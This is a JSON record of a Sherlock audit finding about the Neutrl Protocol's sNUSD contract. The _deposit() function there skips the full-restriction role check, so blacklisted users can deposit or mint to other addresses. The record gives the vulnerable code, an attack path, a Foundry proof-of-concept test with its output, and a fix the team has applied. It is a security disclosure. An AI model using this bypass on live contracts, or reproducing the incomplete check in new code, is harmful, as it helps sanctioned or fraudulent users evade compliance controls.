{
    "id": 62619,
    "kind": "GIT",
    "auditfirm_id": 3,
    "impact": "MEDIUM",
    "finders_count": 39,
    "protocol_id": 3381,
    "title": "M-1: FULL_RESTRICTED_STAKER_ROLE Blacklist Bypass in Deposit and Mint Functions",
    "content": "\nSource: https://github.com/sherlock-audit/2025-08-neutrl-protocol-judging/issues/11 \n\n## Found by \n0xHammad, 0xSlowbug, 0xaxaxa, 0xdice91, 0xpiken, 0xsh, 4Nescient, BusinessShotgun, JeRRy0422, Mishkat6451, NHristov, Orhukl, Sa1ntRobi, Synthrax, TECHFUND-inc, X0sauce, Ziusz, algiz, blockace, boredpukar, c3phas, d33p, devAnas, eeyore, farman1094, gh0xt, globalace, hyuunn, ke1caM, khaye26, maigadoh, pindarev, r1ver, radevweb3, theboiledcorn, theweb3mechanic, v1c7, xKeywordx, xiaoming90\n\n## Summary\nThe _deposit() function only checks for SOFT_RESTRICTED_STAKER_ROLE but not FULL_RESTRICTED_STAKER_ROLE, allowing fully blacklisted users to bypass restrictions by depositing or minting to other addresses.\n\n## Root Cause\nIn sNUSD.sol, (https://github.com/sherlock-audit/2025-08-neutrl-protocol/blob/main/contracts/src/sNUSD.sol#L337-#L344) the _deposit() function has incomplete blacklist checks:\n\n```solidity\nfunction _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal override {\n    if (hasRole(SOFT_RESTRICTED_STAKER_ROLE, caller) || hasRole(SOFT_RESTRICTED_STAKER_ROLE, receiver)) {\n        revert OperationNotAllowed();  // ⚠️ ONLY CHECKS SOFT_RESTRICTED_STAKER_ROLE\n    }\n    if (assets == 0 || shares == 0) revert ZeroInput();\n    super._deposit(caller, receiver, assets, shares);\n    _checkMinShares();\n}\n```\n\n**Missing check for FULL_RESTRICTED_STAKER_ROLE allows blacklisted users to deposit.**\n\n## Internal Pre-conditions\n1. User has FULL_RESTRICTED_STAKER_ROLE (fully blacklisted)\n2. User has NUSD tokens to deposit\n\n## External Pre-conditions\nNone\n\n## Attack Path\n1. Admin blacklists user with FULL_RESTRICTED_STAKER_ROLE\n2. Blacklisted user calls deposit() or mint() with another address as receiver\n3. _deposit() only checks SOFT_RESTRICTED_STAKER_ROLE, not FULL_RESTRICTED_STAKER_ROLE\n4. Deposit/mint succeeds, bypassing blacklist restrictions\n5. Blacklisted user can continue accessing Neutrl's yield strategies through other addresses\n6. Protocol faces regulatory compliance violations and legal exposure\n\n## Impact\n**Critical regulatory and security failure.** Blacklisted users can bypass restrictions and continue accessing Neutrl's yield-generating strategies, undermining:\n\n1. **Regulatory Compliance**: Neutrl operates in OTC markets and with qualified custodians, requiring strict KYC/AML compliance\n2. **Risk Management**: Blacklisted users may be restricted due to sanctions, fraud, or other risk factors\n3. **Protocol Security**: Compromised blacklist system allows bad actors to continue earning yield from market-neutral strategies\n4. **Legal Exposure**: Protocol may face regulatory action for allowing blacklisted entities to participate\n\n**Economic Impact**: Blacklisted users can continue earning yield from Neutrl's OTC arbitrage, basis trading, and funding rate strategies, potentially violating sanctions or enabling money laundering.\n\n## PoC\n\n```solidity\nfunction test_BlacklistBypassViaReceiver() external {\n    console2.log(\"=== BLACKLIST BYPASS VIA RECEIVER ===\");\n    \n    // Setup blacklisted user with tokens\n    deal(address(nusd), blacklistedUser, 1000e18);\n    \n    // Admin blacklists user with FULL_RESTRICTED_STAKER_ROLE\n    vm.startPrank(users.admin);\n    sNusd.grantRole(sNusd.FULL_RESTRICTED_STAKER_ROLE(), blacklistedUser);\n    vm.stopPrank();\n    \n    vm.startPrank(blacklistedUser);\n    nusd.approve(address(sNusd), 1000e18);\n    \n    console2.log(\"Blacklisted user NUSD balance:\", nusd.balanceOf(blacklistedUser));\n    console2.log(\"Normal user sNUSD balance before:\", sNusd.balanceOf(normalUser));\n    \n    // Try to deposit to blacklisted user (should fail)\n    try sNusd.deposit(500e18, blacklistedUser) {\n        console2.log(\"ERROR: Deposit to blacklisted user succeeded!\");\n    } catch {\n        console2.log(\"PASS: Deposit to blacklisted user correctly blocked\");\n    }\n    \n    // Try to deposit to normal user while being blacklisted (BYPASS)\n    try sNusd.deposit(500e18, normalUser) {\n        console2.log(\"WARNING: BLACKLIST BYPASS: Blacklisted user can deposit to normal user!\");\n        \n        console2.log(\"Blacklisted user NUSD balance after:\", nusd.balanceOf(blacklistedUser));\n        console2.log(\"Normal user sNUSD balance after:\", sNusd.balanceOf(normalUser));\n        \n        // Verify bypass succeeded\n        assertGt(sNusd.balanceOf(normalUser), 0, \"Normal user received shares from blacklisted user\");\n        \n    } catch {\n        console2.log(\"PASS: Blacklist working - deposit to normal user also blocked\");\n    }\n    \n    vm.stopPrank();\n}\n```\n\n### Test Output\n```bash\n=== BLACKLIST BYPASS VIA RECEIVER ===\nBlacklisted user NUSD balance: 1000000000000000000000\nNormal user sNUSD balance before: 0\nPASS: Deposit to blacklisted user correctly blocked\nWARNING: BLACKLIST BYPASS: Blacklisted user can deposit to normal user!\nBlacklisted user NUSD balance after: 500000000000000000000\nNormal user sNUSD balance after: 500000000000000000000\n\n=== BLACKLIST BYPASS VIA MINT ===\nTesting mint function bypass...\nWARNING: BLACKLIST BYPASS VIA MINT: Blacklisted user can mint to normal user!\nBlacklisted user NUSD balance after: 500000000000000000000\nNormal user sNUSD balance after: 500000000000000000000\n```\n\n## Mitigation\nAdd FULL_RESTRICTED_STAKER_ROLE checks to _deposit():\n\n```solidity\nfunction _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal override {\n    if (hasRole(SOFT_RESTRICTED_STAKER_ROLE, caller) || hasRole(SOFT_RESTRICTED_STAKER_ROLE, receiver) ||\n        hasRole(FULL_RESTRICTED_STAKER_ROLE, caller) || hasRole(FULL_RESTRICTED_STAKER_ROLE, receiver)) {\n        revert OperationNotAllowed();\n    }\n    if (assets == 0 || shares == 0) revert ZeroInput();\n    super._deposit(caller, receiver, assets, shares);\n    _checkMinShares();\n}\n```\n\nOr create a helper function:\n\n```solidity\nfunction _isRestricted(address user) internal view returns (bool) {\n    return hasRole(SOFT_RESTRICTED_STAKER_ROLE, user) || hasRole(FULL_RESTRICTED_STAKER_ROLE, user);\n}\n\nfunction _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal override {\n    if (_isRestricted(caller) || _isRestricted(receiver)) {\n        revert OperationNotAllowed();\n    }\n    if (assets == 0 || shares == 0) revert ZeroInput();\n    super._deposit(caller, receiver, assets, shares);\n    _checkMinShares();\n}\n```\n\n\n## Discussion\n\n**sherlock-admin2**\n\nThe protocol team fixed this issue in the following PRs/commits:\nhttps://github.com/Neutrl-lab/contracts/pull/46\n\n\n\n\n\n",
    "summary": "\nThis bug report is about a critical issue found in the Neutrl protocol. The issue was discovered by a group of security researchers and it allows blacklisted users to bypass restrictions and continue accessing the protocol's yield-generating strategies. The root cause of the issue is incomplete blacklist checks in the _deposit() function, which only checks for one type of restriction but not the other. This allows blacklisted users to deposit or mint tokens to other addresses and continue earning yield, potentially violating regulations and exposing the protocol to legal action. The bug can be reproduced through a test script and the team has proposed a fix by adding additional checks for both types of restrictions. The fix has been implemented in the protocol's code.",
    "report_date": "2025-08-24T15:00:00.000Z",
    "contest_prize_txt": "118000 USDC",
    "contest_link": "https://app.sherlock.xyz/audits/contests/1065",
    "sponsor_name": "",
    "sponsor_link": "",
    "quality_score": 0,
    "general_score": 0,
    "source_link": "",
    "github_link": "https://github.com/sherlock-audit/2025-08-neutrl-protocol-judging/issues/11",
    "pdf_link": "",
    "pdf_page_from": 0,
    "contest_id": "1065",
    "slug": "m-1-full_restricted_staker_role-blacklist-bypass-in-deposit-and-mint-functions-sherlock-neutrl-protocol-git",
    "firm_name": "Sherlock",
    "firm_logo_square": "sherlock_square.png",
    "protocol_name": "Neutrl Protocol",
    "bookmarked": false,
    "read": false,
    "issues_issue_finders": [
        {
            "wardens_warden": {
                "handle": "TECHFUND-inc"
            }
        },
        {
            "wardens_warden": {
                "handle": "v1c7"
            }
        },
        {
            "wardens_warden": {
                "handle": "Sa1ntRobi"
            }
        },
        {
            "wardens_warden": {
                "handle": "X0sauce"
            }
        },
        {
            "wardens_warden": {
                "handle": "0xdice91"
            }
        },
        {
            "wardens_warden": {
                "handle": "BusinessShotgun"
            }
        },
        {
            "wardens_warden": {
                "handle": "xiaoming90"
            }
        },
        {
            "wardens_warden": {
                "handle": "devAnas"
            }
        },
        {
            "wardens_warden": {
                "handle": "hyuunn"
            }
        },
        {
            "wardens_warden": {
                "handle": "radevweb3"
            }
        },
        {
            "wardens_warden": {
                "handle": "ke1caM"
            }
        },
        {
            "wardens_warden": {
                "handle": "0xaxaxa"
            }
        },
        {
            "wardens_warden": {
                "handle": "Orhukl"
            }
        },
        {
            "wardens_warden": {
                "handle": "blockace"
            }
        },
        {
            "wardens_warden": {
                "handle": "c3phas"
            }
        },
        {
            "wardens_warden": {
                "handle": "theweb3mechanic"
            }
        },
        {
            "wardens_warden": {
                "handle": "Mishkat6451"
            }
        },
        {
            "wardens_warden": {
                "handle": "maigadoh"
            }
        },
        {
            "wardens_warden": {
                "handle": "0xpiken"
            }
        },
        {
            "wardens_warden": {
                "handle": "d33p"
            }
        },
        {
            "wardens_warden": {
                "handle": "boredpukar"
            }
        },
        {
            "wardens_warden": {
                "handle": "0xSlowbug"
            }
        },
        {
            "wardens_warden": {
                "handle": "theboiledcorn"
            }
        },
        {
            "wardens_warden": {
                "handle": "0xsh"
            }
        },
        {
            "wardens_warden": {
                "handle": "xKeywordx"
            }
        },
        {
            "wardens_warden": {
                "handle": "globalace"
            }
        },
        {
            "wardens_warden": {
                "handle": "pindarev"
            }
        },
        {
            "wardens_warden": {
                "handle": "farman1094"
            }
        },
        {
            "wardens_warden": {
                "handle": "eeyore"
            }
        },
        {
            "wardens_warden": {
                "handle": "NHristov"
            }
        },
        {
            "wardens_warden": {
                "handle": "khaye26"
            }
        },
        {
            "wardens_warden": {
                "handle": "0xHammad"
            }
        },
        {
            "wardens_warden": {
                "handle": "4Nescient"
            }
        },
        {
            "wardens_warden": {
                "handle": "r1ver"
            }
        },
        {
            "wardens_warden": {
                "handle": "Synthrax"
            }
        },
        {
            "wardens_warden": {
                "handle": "JeRRy0422"
            }
        },
        {
            "wardens_warden": {
                "handle": "Ziusz"
            }
        },
        {
            "wardens_warden": {
                "handle": "algiz"
            }
        },
        {
            "wardens_warden": {
                "handle": "gh0xt"
            }
        }
    ],
    "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
    },
    "protocols_protocol": {
        "name": "Neutrl Protocol",
        "protocols_protocolcategoryscore": []
    },
    "issues_issuetagscore": []
}